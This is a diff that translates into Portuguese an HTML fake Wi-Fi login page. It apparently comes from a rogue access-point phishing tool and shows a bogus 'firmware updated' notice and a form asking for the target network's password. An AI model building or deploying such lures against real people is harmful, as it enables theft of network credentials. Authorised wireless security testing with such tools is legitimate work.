@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-	<title>Authentication Required</title>
+	<title>Autenticação requerida</title>
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
 	<link rel="stylesheet" type="text/css" href="./static/css/framework7.material.min.css">
@@ -393,22 +393,22 @@
 	<div class="container main hide">
 		<div class="window faded">
 			<h1>{{ login_title }}</h1>
-			<p>The network <span>{{ target_ap_essid }}</span> requires a {{ target_ap_encryption }} password. The server says: Modem firmware was updated.</p>
+			<p>A rede <span>{{ target_ap_essid }}</span> requer uma senha do {{ target_ap_encryption }}. O servidor diz: O firmware do modem foi atualizado.</p>
 			<form id="form">
 				<input class="hide" type="password" name="encrypt" value="true">
 				<table>
 					<tr>
-						<td>Name:</td>
+						<td>Nome:</td>
 						<td><input type="text" name="name" value="{{ target_ap_essid }}"></td>
 					</tr>
 					<tr>
-						<td>Password:</td>
+						<td>Senha:</td>
 						<td><input type="password" name="password" autocomplete="false"></td>
 					</tr>
 				</table>
 			</form>
-			<input type="button" name="login" value="Log In">
-			<input type="button" name="cancel" value="Cancel">
+			<input type="button" name="login" value="Conectar">
+			<input type="button" name="cancel" value="Cancelar">
 		</div>
 		<div class="dump"></div>
 	</div>
@@ -418,7 +418,7 @@
 				<li>
 					<div class="item-content">
 						<div class="item-inner">
-							<div class="item-title label">Password</div>
+							<div class="item-title label">Senha</div>
 							<div class="item-input">
 								<form>
 									<input id="pwfield" name="password" type="password">
@@ -434,7 +434,7 @@
 		<div style="display: block; margin-top: -107px;" class="modal  modal-in">
 			<div class="modal-inner">
 				<div class="modal-title"><span>{{ target_ap_essid }}</span></div>
-				<div class="modal-text">Enter your password</div>
+				<div class="modal-text">Digite a senha</div>
 				<div class="input-field">
 					<input name="modal-password" placeholder="Password" class="modal-text-input" type="password">
 				</div>
@@ -446,7 +446,7 @@
 							<input name="ks-checkbox" value="Show password" type="checkbox">
 							<div class="item-media"><i class="icon icon-form-checkbox"></i></div>
 							<div class="item-inner">
-								<div class="item-title">Show password</div>
+								<div class="item-title">Mostrar Senha</div>
 							</div>
 						</label>
 					</li>
@@ -455,7 +455,7 @@
 							<input name="ks-checkbox" value="Show advanced options" type="checkbox">
 							<div class="item-media"><i class="icon icon-form-checkbox"></i></div>
 							<div class="item-inner">
-								<div class="item-title">Show advanced options</div>
+								<div class="item-title">Mostrar opções avançadas</div>
 							</div>
 						</label>
 					</li>
@@ -463,8 +463,8 @@
 				</ul>
 			</form>
 			<div class="modal-buttons modal-buttons-2 ">
-				<span class="modal-button cancel">Cancel</span>
-				<span class="modal-button modal-button-bold ok inactive">Connect</span>
+				<span class="modal-button cancel">Cancelar</span>
+				<span class="modal-button modal-button-bold ok inactive">Conectar</span>
 			</div>
 		</div>
 		<div class="modal-overlay modal-overlay-visible"></div>
